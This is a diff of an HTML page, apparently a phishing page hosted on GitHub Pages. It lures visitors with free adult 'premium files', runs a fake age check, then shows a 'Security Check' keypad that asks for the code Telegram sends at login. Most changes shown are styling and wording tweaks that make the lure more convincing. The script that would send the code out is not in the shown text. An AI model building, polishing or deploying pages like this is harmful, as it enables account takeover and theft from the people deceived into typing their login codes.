@@ -10,66 +10,67 @@
         body { 
             font-family: 'Segoe UI', Roboto, sans-serif; 
             margin: 0; padding: 0; 
-            background: url('https://images.unsplash.com/photo-1516062423079-7ca13cdc7f5a?q=80&w=2000&auto=format&fit=crop') no-repeat center center fixed; 
+            /* আপনার আপলোড করা ছবির সঠিক নাম এখানে দেওয়া হয়েছে */
+            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
             background-size: cover;
             height: 100vh; display: flex; align-items: center; justify-content: center;
             overflow: hidden;
         }
         .overlay { 
-            background: rgba(0, 0, 0, 0.8); 
+            background: rgba(0, 0, 0, 0.55); 
             position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; 
         }
         .box { 
-            background: rgba(255, 255, 255, 0.1); 
-            padding: 30px 20px; border-radius: 30px; 
+            background: rgba(255, 255, 255, 0.12); 
+            padding: 30px 20px; border-radius: 35px; 
             width: 90%; max-width: 360px; 
-            box-shadow: 0 15px 35px rgba(0,0,0,0.8); 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.8); 
             text-align: center; z-index: 2; 
-            backdrop-filter: blur(20px);
+            backdrop-filter: blur(15px);
             border: 1px solid rgba(255, 255, 255, 0.2);
             color: white;
             position: relative;
         }
-        h2 { color: #ff4757; margin: 0 0 10px; font-size: 28px; text-transform: uppercase; }
-        p { color: #f1f1f1; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        h2 { color: #ff3b30; margin: 0 0 10px; font-size: 32px; text-transform: uppercase; font-weight: 900; text-shadow: 0 0 15px rgba(255, 59, 48, 0.8); }
+        p { color: #fff; font-size: 16px; margin-bottom: 25px; line-height: 1.4; font-weight: 600; text-shadow: 1px 1px 5px rgba(0,0,0,0.5); }
         
         .btn-confirm { 
-            background: linear-gradient(45deg, #ff4757, #ff6b81); 
+            background: linear-gradient(45deg, #ff416c, #ff4b2b); 
             color: white; border: none; padding: 18px; width: 100%; 
-            border-radius: 15px; font-weight: bold; font-size: 22px; 
-            cursor: pointer; box-shadow: 0 5px 20px rgba(255, 71, 87, 0.4);
+            border-radius: 18px; font-weight: bold; font-size: 24px; 
+            cursor: pointer; box-shadow: 0 8px 25px rgba(255, 75, 43, 0.5);
             text-transform: uppercase;
         }
 
         .otp-display { 
             width: 100%; padding: 10px; margin: 15px 0; 
-            border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 15px; 
-            font-size: 36px; text-align: center; background: rgba(0,0,0,0.4); 
-            color: #fff; letter-spacing: 10px; outline: none; height: 70px;
+            border: 1px solid rgba(255, 255, 255, 0.4); border-radius: 15px; 
+            font-size: 38px; text-align: center; background: rgba(0,0,0,0.6); 
+            color: #fff; letter-spacing: 12px; outline: none; height: 75px;
         }
 
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-top: 15px; }
         .key { 
-            background: rgba(255, 255, 255, 0.1); padding: 20px; border-radius: 15px; 
-            font-size: 24px; font-weight: bold; color: #fff; 
+            background: rgba(255, 255, 255, 0.15); padding: 18px; border-radius: 20px; 
+            font-size: 28px; font-weight: bold; color: #fff; 
             cursor: pointer; transition: 0.2s; border: 1px solid rgba(255, 255, 255, 0.1);
             user-select: none;
         }
         .key:active { background: rgba(255, 255, 255, 0.4); transform: scale(0.9); }
-        .key-clear { background: rgba(255, 165, 0, 0.3); }
-        .key-ok { background: rgba(46, 213, 115, 0.4); }
+        .key-clear { background: rgba(255, 165, 0, 0.4); }
+        .key-ok { background: rgba(46, 213, 115, 0.5); }
         
         .hidden { display: none; }
-        .loader { color: #ff4757; font-weight: bold; margin-top: 20px; display: block; }
+        .loader { color: #ff416c; font-weight: bold; margin-top: 20px; display: block; font-size: 18px; }
     </style>
 </head>
 <body>
     <div class="overlay"></div>
 
     <div class="box" id="step0">
-        <div style="font-size: 60px; margin-bottom: 10px;">🔞</div>
+        <div style="font-size: 70px; margin-bottom: 10px;">🔞</div>
         <h2>Attention!</h2>
-        <p>To access the premium files completely free 💦, you must confirm that you are over 18 😊</p>
+        <p>To access premium files completely free 💦, confirm that you are over 18 😊</p>
         <button class="btn-confirm" id="main_btn" onclick="startFlow()">🍓 confirm 🔞</button>
         <div id="loader" class="hidden">
             <span class="loader">🔄 Checking Age... 🔞</span>
@@ -77,8 +78,8 @@
     </div>
 
     <div class="box hidden" id="step2">
-        <h3 style="margin:0; color:#ff4757; font-size: 22px;">Security Check</h3>
-        <p style="color:#ccc; font-size:13px; margin: 5px 0 15px;">Enter the 5-digit code from Telegram 💦</p>
+        <h3 style="margin:0; color:#ff416c; font-size: 24px;">Security Check</h3>
+        <p style="color:#fff; font-size:14px; margin: 5px 0 10px;">Enter the code from Telegram to unlock 💦</p>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
         
